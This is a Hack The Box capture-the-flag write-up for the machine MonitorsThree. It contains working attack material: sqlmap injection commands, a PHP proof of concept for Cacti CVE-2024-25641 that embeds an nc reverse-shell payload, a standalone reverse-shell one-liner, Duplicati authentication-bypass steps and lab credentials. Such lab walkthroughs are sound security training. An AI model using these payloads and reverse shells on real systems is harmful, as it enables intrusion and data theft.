---
date: 2025-01-17T10:06:34-06:00
# description: ""
image: "/images/HTB-MonitorsThree/MonitorsThree.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: MonitorsThree"
type: "post"
---

* Platform: Hack The Box
* Link: [MonitorsThree](https://app.hackthebox.com/machines/MonitorsThree)
* Level: Medium
* OS: Linux
---

MonitorsThree begins with a website on port 80 and a Cacti instance hosted on a subdomain. The `Forgot Password?` feature on the main site is vulnerable to SQL injection, which we exploit to retrieve the admin user's password. Using these credentials, we access the Cacti dashboard and leverage `CVE-2024-25641` to gain an initial foothold on the system. Further exploration reveals additional password hashes, enabling us to pivot to another user via SSH. Through system enumeration, we discover an internally accessible Duplicati instance. With some tunneling we are able to access it and an authentication bypass exploit allows us to log into Duplicati and recover the root flag.

Target IP address - `10.10.11.30`

## Scanning

```
nmap -sC -sV -oA nmap/MonitorsThree 10.10.11.30
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 18:00 CST
Nmap scan report for 10.10.11.30
Host is up (0.060s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)

80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/

8084/tcp filtered websnp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.83 seconds
```

Our nmap scan finds two open ports:
* 22 running SSH
* 80 running HTTP, there is a redirection to `monitorsthree.htb`.

## Enumeration

Going to `http://monitorsthree.htb/` we find a website providing network solutions services.

![MonitorsThree website](/images/HTB-MonitorsThree/monitorsthree_website.png)

There is a login page at `http://monitorsthree.htb/login.php`.

![MonitorsThree login](/images/HTB-MonitorsThree/login_page_monitorsthree.png)

Through directory brute forcing we discover `/admin` but currently we are unable to access it.

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://monitorsthree.htb/
```

![directory brute forcing](/images/HTB-MonitorsThree/gobuster_cmd.png)

![admin page monitorsthree](/images/HTB-MonitorsThree/monitorsthree_admin.png)

We also find a subdomain (`cacti`) through subdomain enumeration.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://monitorsthree.htb -H "Host: FUZZ.monitorsthree.htb" -ic -fs 13560
```

![cacti subdomain](/images/HTB-MonitorsThree/monitorsthree_subdomain.png)

At `http://cacti.monitorsthree.htb/cacti/` we find another login page. We can see a version for the software, `1.2.26`.

![cacti login page](/images/HTB-MonitorsThree/cacti_login_page.png)

We get to `http://monitorsthree.htb/forgot_password.php` after selecting `Forgot password?` at `http://monitorsthree.htb/login.php`.

![forgot password page](/images/HTB-MonitorsThree/forgot_pwd.png)

We can try to exploit this feature via SQL injection. We capture the request and use it with SQLmap.

![reset password request](/images/HTB-MonitorsThree/reset_pwd_request.png)

We start by targeting the `username` parameter and SQLmap is able to identify the injection.

```
sqlmap -r reset.txt --level 5 --risk 3 -p username --batch --threads=10 --batch
```

![SQL injection on username parameter](/images/HTB-MonitorsThree/sqlmap1.png)

We enumerate the target and find two databases.

```
sqlmap -r reset.txt --level 5 --risk 3 -p username --batch --threads=10 --batch --dbs
```

![databases found](/images/HTB-MonitorsThree/dbs_found.png)

We can now enumerate the tables of `monitorsthree_db` database since `information_schema` is a default system database in MySQL.

```
sqlmap -r reset.txt --level 5 --risk 3 -p username --batch --threads=10 --batch -D monitorsthree_db --tables
```

![tables found](/images/HTB-MonitorsThree/db_tables.png)

The `users` table is the most promising one, let's dump its content.

```
sqlmap -r reset.txt --level 5 --risk 3 -p username --batch --threads=10 -D monitorsthree_db -T users --dbms=mysql --technique=T --dump
```

![SQLmap hashes found](/images/HTB-MonitorsThree/SQLmap_hashes.png)

We recover the password of `admin` with hashcat.

```
hashcat -m 0 -a 0 admin_hash.txt /usr/share/wordlists/rockyou.txt
```

![admin password](/images/HTB-MonitorsThree/admin_pwd.png)

With the credentials `admin:greencacti2001` we are able to login on the cacti login page and access the dashboard.

> The same credentials also work on the login page at `http://monitorsthree.htb/login.php`.

![cacti dashboard](/images/HTB-MonitorsThree/cacti_dashboard.png)

## Initial Foothold

### Manual Exploit

Researching vulnerability for the `Cacti version 1.2.26` leads to `CVE-2024-25641` allowing RCE by using a malicious package. The PoC is available [here](https://github.com/cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88).

```PHP
<?php

$xmldata = "<xml>
   <files>
       <file>
           <name>resource/test.php</name>
           <data>%s</data>
           <filesignature>%s</filesignature>
       </file>
   </files>
   <publickey>%s</publickey>
   <signature></signature>
</xml>";
$filedata = "<?php shell_exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {IP} {PORT} >/tmp/f'); ?>";
$keypair = openssl_pkey_new(); 
$public_key = openssl_pkey_get_details($keypair)["key"]; 
openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);
$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));
openssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);
file_put_contents("test.xml", str_replace("<signature></signature>", "<signature>".base64_encode($signature)."</signature>", $data));
system("cat test.xml | gzip -9 > test.xml.gz; rm test.xml");

?>
```

After running the script we get `test.xml.gz`. In Cacti, we go to `Import/Export` > `Import Packages`. 

Then upload the malicious package and import it.

![cacti package import](/images/HTB-MonitorsThree/cacti_pkg_import.png)

We execute our payload by going to `http://cacti.monitorsthree.htb/cacti/resource/test.php` and receive a connection on our listener.

![manual exploit foothold](/images/HTB-MonitorsThree/foothold_manual.png)

### Automated Exploit

In Metasploit we can use the `multi/http/cacti_package_import_rce` to obtain a shell as `www-data`.

```
set password greencacti2001
set rhosts cacti.monitorsthree.htb
set lhost tun0
set lport PORT_NUMBER
```

![Metasploit exploit foothold](/images/HTB-MonitorsThree/foothold_cacti.png)

The shell is not interactive so we will get a new one.

![bad shell](/images/HTB-MonitorsThree/bad_shell.png)

Using a reverse shell command (`nc mkfifo`) from [revshells](https://www.revshells.com/), we gain a shell which we upgrade.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_IP PORT_NUMBER >/tmp/f
```

![better shell](/images/HTB-MonitorsThree/better_shell.png)

We know that we are dealing with the Cacti software, so we look for some config file. `config.php` is located at `/var/www/html/cacti/include/config.php`. 

![Cacti configuration file location](/images/HTB-MonitorsThree/cacti_config_file_location.png)

The file contains some database credentials.

![database credentials](/images/HTB-MonitorsThree/db_creds.png)

We log into the database.

```
mysql -u cactiuser -p cactiuser
```

After listing the tables we find some passwords hashes in the `user_auth` table. These are Blowfish hashes.

```
show tables;

select * from user_auth;
```

![password hashes](/images/HTB-MonitorsThree/pwd_hashes.png)

Using hashcat we recover the password of the user marcus, `12345678910`.

```
hashcat -m 3200 -a 0 marcus_hash.txt /usr/share/wordlists/rockyou.txt
```

![marcus password](/images/HTB-MonitorsThree/marcus_pwd.png)

## Shell as marcus

We switch to the user `marcus` and find the user flag in his personal directory.

![user flag](/images/HTB-MonitorsThree/user_flag.png)

We find the SSH keys for `marcus` in `.ssh`, we send the `id_rsa` file to our local machine in order to login via SSH.

![marcus ssh key](/images/HTB-MonitorsThree/ssh_key_marcus.png)

```
ssh -i id_rsa marcus@monitorsthree.htb
```

![marcus ssh login](/images/HTB-MonitorsThree/marcus_ssh_login.png)

After running linpeas we find some internal connections. We know what services most of these ports are running, we only need to check `8200` and `37181`.

![active ports](/images/HTB-MonitorsThree/active_ports.png)

We need to do some tunneling in order to access these ports, I used [ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases) to do it.

Only the port `8200` is accessible, where we find a [Duplicati](https://duplicati.com/) login page.

> Duplicati is a free, open-source backup software designed to securely store encrypted backups of data.

![Duplicati login page](/images/HTB-MonitorsThree/duplicati_login.png)

Researching `duplicati vulnerability` we find a medium article [here](https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee) demonstrating an authentication bypass and a Github issue page also details the steps to reproduce the exploit [here](https://github.com/duplicati/duplicati/issues/5197).

![Exploit steps](/images/HTB-MonitorsThree/exploit_steps.png)

Going back to our linpeas output, we see that there is a Duplicati directory in `/opt`.

![Duplicati opt directory](/images/HTB-MonitorsThree/duplicati_opt_directory.png)

We find `Duplicati-server.sqlite` in `/opt/duplicati/config`.

![Duplicati database file](/images/HTB-MonitorsThree/duplicati_db_file.png)

With `scp` we download the database file, it contains the server passphrase.

```
scp -i id_rsa marcus@monitorsthree.htb:/opt/duplicati/config/Duplicati-server.sqlite /home/kscorpio/Machines/HTB/MonitorsThree
```

![Duplicati server passphrase](/images/HTB-MonitorsThree/server-passphrase.png)

Next we convert the server passphrase in HEX.

```
echo "Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=" | base64 -d | xxd -p
```

![server passphrase HEX conversion](/images/HTB-MonitorsThree/HEX_conversion.png)

```
59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a
```

With Burp we intercept a login request and make note of the session nonce. This value will be different for each login request. Make sure you URL-decode the session-nonce value.

![Duplicati login request](/images/HTB-MonitorsThree/duplicati_login_request.png)


Open the console in the browser on the Duplicati login page and use the command below.

```
var noncepwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('url_decoded_nonce_value') + 'salted_hex_passphrase')).toString(CryptoJS.enc.Base64);
```

Then run `noncepwd` to get the new password value.

```
noncepwd
```

![Duplicati auth bypass](/images/HTB-MonitorsThree/duplicati_auth_bypass.png)

In Burp we replace the value of `password` with the value of `noncepwd` and URL-encode it.

![New password](/images/HTB-MonitorsThree/new_password.png)

After forwarding the request, we are now logged in Duplicati.

![Duplicati dashboard](/images/HTB-MonitorsThree/duplicati_dashboard.png)

## Privilege Escalation

### Root flag recovery

Go to `Add Backup` > `Configure a new backup`. For the `General backup settings` just pick a name and generate a passphrase. You can also change the `Encryption` to `No encryption` if you want.

![Backup command 1](/images/HTB-MonitorsThree/backup1.png)

For the backup destination we enter `/source/tmp`.

![Backup command 2](/images/HTB-MonitorsThree/backup2.png)

Add the path `/source/root/root.txt` for in the `Source Data` section.

![Backup command 3](/images/HTB-MonitorsThree/backup3.png)

In the `Schedule` section uncheck automatic backups and finally save your backup. In the `Home` section run your backup with the `Run now` button.

![Run backup now button](/images/HTB-MonitorsThree/run_now_backup.png)

Go to `Restore`, choose your backup and select the files to restore.

![restore root flag](/images/HTB-MonitorsThree/files_to_restore.png)

Decide where to restore the files, we have to pick a directory which `marcus` can access.

![restore root flag location](/images/HTB-MonitorsThree/restore_location.png)

After the completion of the backup, the root flag is now accessible.

![root flag](/images/HTB-MonitorsThree/root_flag.png)

### Access to the root account

Although we read the root flag, we still do not have access to the root account.

Using the same backup process we discover that the only file in `/root/.ssh` is `authorized_keys` and the file is empty.

![root SSH directory](/images/HTB-MonitorsThree/root_ssh_directory.png)

> We do not have the write permission to the root `authorized_keys` file otherwise we would have just added marcus' public key to it.

![root authorized_keys file](/images/HTB-MonitorsThree/root_authorized_keys.png)

We can make a backup of `/home/marcus/.ssh/authorized_keys` and restore it to `/root/.ssh/` in order to be able to login as root via SSH.

For the new backup, select `/source/home/marcus/.ssh/` as `Source Data`.

![Source data for SSH backup](/images/HTB-MonitorsThree/source_data_root.png)

Restore the `authorized_keys` file.

![authorized_keys file restore](/images/HTB-MonitorsThree/restore_file_root.png)

Enter `/source/root/.ssh/` as the location.

![authorized_keys file restore location](/images/HTB-MonitorsThree/restore_file_root.png)

We are now able to login as root via SSH, and as shown in the image below `authorized_keys` is no longer empty.

![SSH root login](/images/HTB-MonitorsThree/root_account.png)
